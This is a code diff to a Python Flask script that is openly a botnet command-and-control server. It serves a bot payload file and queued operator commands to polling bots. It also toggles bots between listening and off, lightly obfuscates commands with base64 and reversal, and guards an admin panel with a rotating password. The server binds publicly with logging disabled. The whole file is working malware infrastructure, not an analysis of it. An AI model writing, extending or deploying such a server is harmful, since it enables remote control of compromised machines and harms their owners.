@@ -1,30 +1,26 @@
-import subprocess
-import flask
+# imports
+import subprocess, flask
 from flask import request, jsonify
 from os import system, name
-import logging
-import base64
-import time
-import string
-import random
+import logging, base64, time, string, random
 
+#  define server settings and setting admin password
 host = "0.0.0.0"
 port = 80
-
 global adminpass
-adminpass = str(''.join(
+adminpass = str("".join(
   random.choices(string.ascii_lowercase + string.digits, k=7)))
 
 
+# clear the console supporting cross platform
 def clear():
-  # for windows
   if name == "nt":
     _ = system("cls")
-  # for mac and linux(here, os.name is 'posix')
   else:
     _ = system("clear")
 
 
+# fancy date
 def datetime():
   part1 = str(time.localtime()).replace("time.struct_time(", "")
   part2 = part1.replace(")", "")
@@ -50,6 +46,7 @@ def datetime():
   return f"[{month}/{day}/{year}][{hour}:{minute}:{seconds}]"
 
 
+# encode input with base64
 def b64_encode(input):
   input_ascii = input.encode("ascii")
   input_b64_raw = base64.b64encode(input_ascii)
@@ -57,6 +54,7 @@ def b64_encode(input):
   return input_b64
 
 
+# decode base64 input
 def b64_decode(string):
   string_ascii = string.encode("ascii")
   string_decoded_raw = base64.b64decode(string_ascii)
@@ -64,10 +62,12 @@ def b64_decode(string):
   return string_decoded
 
 
+# reverse input
 def reverse(input):
   return input[::-1]
 
-
+  
+# full encode
 def encode(string):
   step1 = b64_encode(string)
   step2 = reverse(step1)
@@ -75,6 +75,7 @@ def encode(string):
   return output
 
 
+# full decode
 def decode(string):
   step4 = b64_decode(string)
   step5 = reverse(step4)
@@ -82,17 +83,20 @@ def decode(string):
   return output
 
 
+# clear the command file
 def clearcommand():
   with open("txt/command.txt", "r+") as file:
     file.truncate(0)
 
 
+# get the contents of the command file
 def getcommand():
   with open("txt/command.txt", "r+") as commandfile:
     command = commandfile.read()
     return command
 
 
+# set the content of the command file
 def setcommand(command):
   with open("txt/command.txt", "r+") as commandfile:
     commandfile.truncate(0)
@@ -101,18 +105,19 @@ def setcommand(command):
     return command
 
 
+# toggle the bots
 def bottoggle():
   global x
   x = not x
   if x == True:
-    with open("bottoggle.txt", "r+") as bottogglefile:
+    with open("txt/bottoggle.txt", "r+") as bottogglefile:
       bottogglefile.truncate(0)
       bottogglefile.writelines(encode(str("listen")))
       bottogglefile.close()
       print("cnc > bots set to Listen")
       return "listen"
   else:
-    with open("bottoggle.txt", "r+") as bottogglefile:
+    with open("txt/bottoggle.txt", "r+") as bottogglefile:
       bottogglefile.truncate(0)
       bottogglefile.writelines(encode(str("off")))
       bottogglefile.close()
@@ -120,24 +125,29 @@ def bottoggle():
       return "off"
 
 
-with open("txt/bottoggle.txt", "r+") as bottogglefile:
-  bottogglefile.truncate(0)
-  bottogglefile.writelines(encode(str("off")))
-  bottogglefile.close()
-
+# define the app and some basic values
 app = flask.Flask(__name__)
-
 x = True
 bots = 0
 
 
+# the main page
 @app.route("/", methods=["GET"])
 def api_home():
-  with open('html/login.html', 'r') as f:
+  with open("html/index.html", "r") as f:
     html = f.read()
   return html
 
 
+# the login page
+@app.route("/login", methods=["GET"])
+def api_login():
+  with open("html/login.html", "r") as f:
+    html = f.read()
+  return html
+
+
+# where the bot checks if its toggled or not
 @app.route("/check", methods=["GET"])
 def api_check():
   with open("txt/bottoggle.txt", "r+") as bottogglefile:
@@ -145,6 +155,7 @@ def api_check():
     return istoggled
 
 
+# where the bot gets controlled
 @app.route("/bot", methods=["GET"])
 def api_bot():
   if "check" in request.args:
@@ -160,12 +171,12 @@ def api_bot():
     with open("bot.py") as f:
       contents = f.read()
       return contents
-
   else:
     command = getcommand()
     return command
 
 
+# the main cnc access
 @app.route("/cnc", methods=["GET"])
 def api_cnc():
   if "command" in request.args:
@@ -183,72 +194,80 @@ def api_cnc():
   ├── Print Message
   │   └── /cnc?command=*print*Hello%%World\n"""
   else:
-    with open('html/404.html', 'r') as f:
+    with open("html/404.html", "r") as f:
       errorpage = f.read()
     return errorpage
 
 
-@app.route("/help", methods=["GET"])
-def api_help():
-  return """
-  ├── /help
-  ├── /cnc
-  │   └── /cnc?help
-  ├── /bot
-  │   └── /bot?help\n"""
+# the admin/auth
 
 
 @app.route("/admin", methods=["GET"])
 def admin():
   if "passwordcheck" in request.args:
     global adminpass
-    if request.args['passwordcheck'] == adminpass:
+    if request.args["passwordcheck"] == adminpass:
       print("cnc > Admin authenticated")
       return "good"
     else:
       print("cnc > Admin authentication failed")
       return "bad"
   else:
-    with open('html/404.html', 'r') as f:
+    with open("html/404.html", "r") as f:
       errorpage = f.read()
     return errorpage
 
 
+# the main panel
 @app.route("/panel", methods=["GET"])
 def panel():
   if "password" in request.args:
     global adminpass
-    if request.args['password'] == adminpass:
-      with open('html/panel.html', 'r') as f:
+    if request.args["password"] == adminpass:
+      with open("html/panel.html", "r") as f:
         panel_page = f.read()
       print("cnc > Admin Logged into panel")
-      adminpass = str(''.join(
+      adminpass = str("".join(
         random.choices(string.ascii_lowercase + string.digits, k=7)))
+      clear()
+      print(banner())
       print(f"cnc > Admin password changed > {adminpass}")
       return panel_page
     else:
-      with open('html/404.html', 'r') as f:
+      with open("html/404.html", "r") as f:
         errorpage = f.read()
       return errorpage
   else:
-    with open('html/404.html', 'r') as f:
+    with open("html/404.html", "r") as f:
       errorpage = f.read()
     return errorpage
 
 
+# goofy ahh temp way to call the style.css
+@app.route("/style.css", methods=["GET"])
+def style():
+  with open("html/style.css", "r") as f:
+    css = f.read()
+  return css
+
+
+# server log banner
 def banner():
   return f"""
   Flask Cnc Server
   ├── Started at {datetime()}
   ├── Admin Password : {adminpass}
   ├── Host           : {host}
-  └── Port           : {port}\n"""
+  └── Port           : {port}
+"""
 
 
+# disable the flask logs
 log = logging.getLogger("werkzeug")
 log.disabled = True
+# clear the console
 clear()
+# print the banner
 print(banner())
-
-# app.run(host=host, port=port, debug=True)
+# start the server
 app.run(host=host, port=port, debug=True)
